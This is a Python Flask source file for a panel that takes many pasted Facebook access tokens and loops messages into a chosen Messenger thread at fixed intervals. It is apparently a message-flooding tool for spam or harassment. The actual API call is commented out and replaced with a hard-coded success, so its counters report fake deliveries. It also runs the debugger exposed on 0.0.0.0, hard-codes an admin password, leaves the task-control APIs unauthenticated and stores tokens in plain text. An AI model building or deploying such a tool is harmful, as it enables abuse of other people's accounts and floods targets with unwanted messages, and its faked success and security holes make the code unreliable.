from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from threading import Thread, Event
import os, uuid, json, logging, time, requests
from sqlalchemy import create_engine, Column, String, Integer, Text, DateTime
from sqlalchemy.orm import sessionmaker, declarative_base
from datetime import datetime
import secrets

# ---------------- APP SETUP ----------------
app = Flask(__name__)
app.secret_key = secrets.token_hex(16)  # Secure random secret key
app.debug = True

# ---------------- DATABASE SETUP ----------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_NAME = "tasks.db"
engine = create_engine(f'sqlite:///{os.path.join(BASE_DIR, DB_NAME)}?check_same_thread=False')
Base = declarative_base()
Session = sessionmaker(bind=engine)

# Create a global session
db_session = Session()

class Task(Base):
    __tablename__ = 'tasks'
    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    username = Column(String(50), default="Unknown")
    thread_id = Column(String(50), nullable=False)
    prefix = Column(String(255))
    interval = Column(Integer)
    messages = Column(Text)
    tokens = Column(Text)
    status = Column(String(20), default='Running')  # Running, Paused, Stopped
    messages_sent = Column(Integer, default=0)
    start_time = Column(DateTime, default=datetime.utcnow)
    last_active = Column(DateTime, default=datetime.utcnow)
    total_messages = Column(Integer, default=0)

# Create tables if they don't exist
Base.metadata.create_all(engine)

# ---------------- RUNNING TASKS ----------------
running_tasks = {}  # task_id -> {thread, stop_event, pause_event}

# ---------------- MESSAGE SENDING LOGIC ----------------
def send_messages(task_id, stop_event, pause_event):
    # Thread-specific session
    thread_db_session = Session()
    task = thread_db_session.query(Task).filter_by(id=task_id).first()
    
    if not task:
        thread_db_session.close()
        return

    tokens = json.loads(task.tokens)
    messages = json.loads(task.messages)
    headers = {'Content-Type': 'application/json'}

    logging.info(f"Starting task {task_id} with {len(tokens)} tokens and {len(messages)} messages")

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        
        try:
            for message_content in messages:
                if stop_event.is_set() or pause_event.is_set():
                    break

                for access_token in tokens:
                    if stop_event.is_set() or pause_event.is_set():
                        break
                    
                    api_url = f'https://graph.facebook.com/v15.0/t_{task.thread_id}/'
                    message = f"{task.prefix} {message_content}"
                    parameters = {'access_token': access_token, 'message': message}

                    try:
                        # Simulate API call (replace with actual API call)
                        # response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                        # if response.status_code == 200:
                        if True:  # Simulate success
                            task.messages_sent += 1
                            task.total_messages += 1
                            task.last_active = datetime.utcnow()
                            thread_db_session.commit()
                            logging.info(f"✅ Sent: {message[:30]}... for Task ID: {task.id}")
                        else:
                            logging.warning(f"❌ Fail: {message[:30]}... for Task ID: {task.id}")
                    except requests.exceptions.RequestException as e:
                        logging.error(f"⚠️ Network error for Task ID {task.id}: {e}")

                time.sleep(task.interval)
                
        except Exception as e:
            logging.error(f"⚠️ Error in message loop for Task ID {task.id}: {e}")
            thread_db_session.rollback()
            time.sleep(10)
    
    logging.info(f"Task {task_id} stopped")
    thread_db_session.close()

def start_task(task):
    if task.id in running_tasks:
        logging.info(f"Task {task.id} is already running")
        return
        
    stop_event = Event()
    pause_event = Event()
    thread = Thread(target=send_messages, args=(task.id, stop_event, pause_event))
    thread.daemon = True
    thread.start()
    
    running_tasks[task.id] = {
        'thread': thread, 
        'stop_event': stop_event, 
        'pause_event': pause_event
    }
    
    logging.info(f"Started task {task.id}")

# ---------------- ROUTES ----------------
@app.route('/')
def home_page():
    return render_template('index.html')

@app.route('/user', methods=['GET', 'POST'])
def user_panel():
    if request.method == 'POST':
        try:
            tokens_text = request.form.get('tokens', '')
            thread_id = request.form.get('threadId')
            prefix = request.form.get('prefix')
            interval = int(request.form.get('interval', 5))
            messages_file = request.files['txtFile']
            
            tokens_list = [token.strip() for token in tokens_text.split('\n') if token.strip()]
            messages_list = messages_file.read().decode().splitlines()
            
            logging.info(f"Creating new task with {len(tokens_list)} tokens and {len(messages_list)} messages")
            
            task = Task(
                thread_id=thread_id,
                prefix=prefix,
                interval=interval,
                messages=json.dumps(messages_list),
                tokens=json.dumps(tokens_list)
            )
            
            db_session.add(task)
            db_session.commit()
            
            start_task(task)
            logging.info(f"Task created: {task.id}")
            
        except Exception as e:
            logging.error(f"Error creating task: {e}")
            return f"Error: {e}", 500
        
        return redirect(url_for('user_panel'))
    
    # Get all tasks for display
    tasks = db_session.query(Task).order_by(Task.start_time.desc()).all()
    return render_template('user.html', tasks=tasks)

@app.route('/admin', methods=['GET', 'POST'])
def admin_panel():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'AXSHU143':  # Admin password
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    
    if not session.get('admin'):
        return render_template('login.html')
    
    # Get all tasks for display
    tasks = db_session.query(Task).order_by(Task.start_time.desc()).all()
    return render_template('admin.html', tasks=tasks)

# ---------------- TASK MANAGEMENT API ----------------
@app.route('/api/task/<task_id>/pause', methods=['POST'])
def api_pause_task(task_id):
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        task.status = 'Paused'
        # Update the running task
        if task_id in running_tasks:
            running_tasks[task_id]['pause_event'].set()
        db_session.commit()
        return jsonify({'success': True, 'message': 'Task paused successfully'})
    return jsonify({'success': False, 'message': 'Task not found'})

@app.route('/api/task/<task_id>/resume', methods=['POST'])
def api_resume_task(task_id):
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        task.status = 'Running'
        # Update the running task
        if task_id in running_tasks:
            running_tasks[task_id]['pause_event'].clear()
        db_session.commit()
        return jsonify({'success': True, 'message': 'Task resumed successfully'})
    return jsonify({'success': False, 'message': 'Task not found'})

@app.route('/api/task/<task_id>/stop', methods=['POST'])
def api_stop_task(task_id):
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        task.status = 'Stopped'
        # Update the running task
        if task_id in running_tasks:
            running_tasks[task_id]['stop_event'].set()
            del running_tasks[task_id]
        db_session.commit()
        return jsonify({'success': True, 'message': 'Task stopped successfully'})
    return jsonify({'success': False, 'message': 'Task not found'})

@app.route('/api/task/<task_id>/delete', methods=['DELETE'])
def api_delete_task(task_id):
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        # Stop the task if it's running
        if task_id in running_tasks:
            running_tasks[task_id]['stop_event'].set()
            del running_tasks[task_id]
        
        db_session.delete(task)
        db_session.commit()
        return jsonify({'success': True, 'message': 'Task deleted successfully'})
    return jsonify({'success': False, 'message': 'Task not found'})

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_panel'))

# ---------------- RUN APP ----------------
if __name__ == '__main__':
    # Setup logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
    
    logging.info("Starting application...")
    
    # Resume previous tasks
    try:
        tasks_to_resume = db_session.query(Task).filter(Task.status.in_(['Running', 'Paused'])).all()
        logging.info(f"Resuming {len(tasks_to_resume)} tasks...")
        
        for task in tasks_to_resume:
            logging.info(f"Resuming task: {task.id}")
            start_task(task)
            # Set pause event if task was paused
            if task.status == 'Paused' and task.id in running_tasks:
                running_tasks[task.id]['pause_event'].set()
                
    except Exception as e:
        logging.error(f"Error resuming tasks: {e}")
    
    logging.info("Application started successfully!")
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
